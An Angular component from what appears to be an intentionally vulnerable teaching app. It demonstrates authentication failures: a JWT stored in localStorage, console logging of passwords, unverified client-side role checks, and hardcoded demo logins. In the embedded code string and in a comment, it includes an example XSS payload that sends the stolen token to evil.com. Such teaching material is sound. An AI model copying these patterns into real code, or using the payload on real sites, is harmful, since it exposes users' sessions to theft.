/**
 * VULNERABLE: Login Form Component
 *
 * Security Issues:
 * - A02: Cryptographic Failures (credentials in logs/URL)
 * - A07: Identification and Authentication Failures
 *
 * DO NOT USE IN PRODUCTION
 */

import { Component } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { VulnerableAuthService } from '../../services/auth.service';

@Component({
  selector: 'app-vulnerable-login-form',
  standalone: true,
  imports: [CommonModule, FormsModule],
  template: `
    <div class="vulnerability-demo">
      <div class="header">
        <h2>VULNERABLE: Authentication Failures</h2>
        <span class="badge danger">A02/A07: Auth Failures</span>
      </div>

      <div class="description">
        <p>
          This component demonstrates insecure authentication patterns including
          storing JWT in localStorage, logging credentials, and weak session management.
        </p>
      </div>

      <div class="demo-section">
        <h3>Login Form</h3>

        @if (!isLoggedIn) {
          <form (ngSubmit)="onLogin()" class="login-form">
            <div class="input-group">
              <label for="email">Email:</label>
              <input
                id="email"
                type="email"
                [(ngModel)]="email"
                name="email"
                placeholder="user@example.com"
              >
            </div>

            <div class="input-group">
              <label for="password">Password:</label>
              <input
                id="password"
                type="password"
                [(ngModel)]="password"
                name="password"
                placeholder="password123"
              >
            </div>

            <button type="submit">Login</button>
          </form>

          <div class="demo-credentials">
            <p><strong>Demo credentials:</strong></p>
            <p>User: <code>user&#64;example.com</code> / <code>password123</code></p>
            <p>Admin: <code>admin&#64;example.com</code> / <code>admin123</code></p>
          </div>
        } @else {
          <div class="logged-in-panel">
            <p>Logged in as: <strong>{{ currentUser?.email }}</strong></p>
            <p>Role: <span class="role-badge" [class.admin]="isAdmin">{{ currentUser?.role }}</span></p>

            <div class="token-display">
              <p><strong>JWT Token (stored in localStorage):</strong></p>
              <code class="token">{{ token }}</code>
              <p class="warning">This token is accessible via JavaScript!</p>
            </div>

            <button (click)="onLogout()" class="logout-btn">Logout</button>
          </div>
        }
      </div>

      <div class="demo-section">
        <h3>Steal Token (XSS Simulation)</h3>
        <p>If an attacker injects XSS, they can steal the token:</p>
        <button (click)="simulateXssAttack()" class="attack-btn">Simulate XSS Token Theft</button>
        @if (stolenToken) {
          <div class="stolen-token">
            <p><strong>Stolen token:</strong></p>
            <code>{{ stolenToken }}</code>
            <p class="warning">Attacker can now impersonate you!</p>
          </div>
        }
      </div>

      <div class="code-section">
        <h3>Vulnerable Code</h3>
        <pre><code>{{ vulnerableCode }}</code></pre>
      </div>

      <div class="explanation">
        <h3>Security Issues</h3>
        <ul>
          <li><strong>localStorage JWT:</strong> Tokens stored in localStorage are accessible via XSS attacks</li>
          <li><strong>Credential logging:</strong> Passwords are logged to console (visible in browser devtools)</li>
          <li><strong>No signature verification:</strong> JWT is decoded without verifying the signature</li>
          <li><strong>Client-side role checking:</strong> Role is checked from decoded token, not server</li>
          <li><strong>No server logout:</strong> Logout only clears client-side storage</li>
        </ul>
      </div>
    </div>
  `,
  styles: [`
    .vulnerability-demo { max-width: 800px; }
    .header { display: flex; align-items: center; gap: 1rem; margin-bottom: 1rem; }
    .header h2 { margin: 0; color: #dc3545; }
    .badge { padding: 0.25rem 0.5rem; border-radius: 4px; font-size: 0.75rem; font-weight: 600; }
    .badge.danger { background: #dc3545; color: white; }
    .description { background: #fff5f5; padding: 1rem; border-radius: 8px; margin-bottom: 1.5rem; border-left: 4px solid #dc3545; }
    .demo-section { background: #f8f9fa; padding: 1.5rem; border-radius: 8px; margin-bottom: 1.5rem; }
    .demo-section h3 { margin-top: 0; }
    .login-form { max-width: 300px; }
    .input-group { margin-bottom: 1rem; }
    .input-group label { display: block; margin-bottom: 0.5rem; font-weight: 500; }
    .input-group input { width: 100%; padding: 0.75rem; border: 1px solid #ddd; border-radius: 4px; }
    button { padding: 0.75rem 1.5rem; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
    button:hover { background: #0056b3; }
    .demo-credentials { margin-top: 1rem; padding: 1rem; background: #e9ecef; border-radius: 4px; }
    .demo-credentials code { background: #dee2e6; padding: 0.125rem 0.375rem; border-radius: 4px; }
    .logged-in-panel { padding: 1rem; background: #d4edda; border-radius: 4px; }
    .role-badge { padding: 0.25rem 0.5rem; border-radius: 4px; background: #6c757d; color: white; }
    .role-badge.admin { background: #dc3545; }
    .token-display { margin-top: 1rem; padding: 1rem; background: white; border-radius: 4px; }
    .token { display: block; word-break: break-all; padding: 0.5rem; background: #f8f9fa; border-radius: 4px; font-size: 0.75rem; }
    .logout-btn { background: #dc3545; margin-top: 1rem; }
    .attack-btn { background: #dc3545; }
    .stolen-token { margin-top: 1rem; padding: 1rem; background: #f8d7da; border-radius: 4px; }
    .warning { color: #dc3545; font-weight: 500; margin-top: 0.5rem; }
    .code-section pre { background: #1a1a2e; color: #e0e0e0; padding: 1rem; border-radius: 8px; overflow-x: auto; }
    .code-section code { font-family: 'Fira Code', monospace; font-size: 0.85rem; }
    .explanation { background: #fff3cd; padding: 1rem; border-radius: 8px; border-left: 4px solid #ffc107; }
    .explanation h3 { margin-top: 0; }
  `]
})
export class VulnerableLoginFormComponent {
  email = '';
  password = '';
  stolenToken = '';

  vulnerableCode = `
// VULNERABLE: Auth service stores JWT in localStorage

// Login - stores token in localStorage
login(email: string, password: string) {
  console.log('Login:', { email, password }); // VULN: Logging credentials!

  const token = await this.api.login(email, password);
  localStorage.setItem('auth_token', token); // VULN: XSS accessible!
}

// Getting token - any XSS can access this
getToken(): string | null {
  return localStorage.getItem('auth_token');
}

// Checking role - trusts decoded token without server verification
isAdmin(): boolean {
  const decoded = this.decodeToken();
  return decoded?.role === 'admin'; // VULN: Not verified by server!
}

// XSS Attack payload:
// <script>
//   fetch('https://evil.com/steal?t=' + localStorage.getItem('auth_token'));
// </script>
  `.trim();

  constructor(private authService: VulnerableAuthService) {}

  get isLoggedIn(): boolean {
    return this.authService.isAuthenticated();
  }

  get currentUser() {
    return this.authService.getCurrentUser();
  }

  get token(): string | null {
    return this.authService.getToken();
  }

  get isAdmin(): boolean {
    return this.authService.isAdmin();
  }

  onLogin(): void {
    if (this.email && this.password) {
      // VULN: Credentials logged in service
      this.authService.login(this.email, this.password);
    }
  }

  onLogout(): void {
    this.authService.logout();
    this.stolenToken = '';
  }

  simulateXssAttack(): void {
    // Simulating what an XSS attack could do
    const token = localStorage.getItem('auth_token');
    if (token) {
      this.stolenToken = token;
      // In a real attack, this would be sent to the attacker's server:
      // fetch('https://evil.com/steal?token=' + token);
      console.warn('XSS ATTACK: Token stolen!', token);
    } else {
      alert('No token to steal. Please login first.');
    }
  }
}
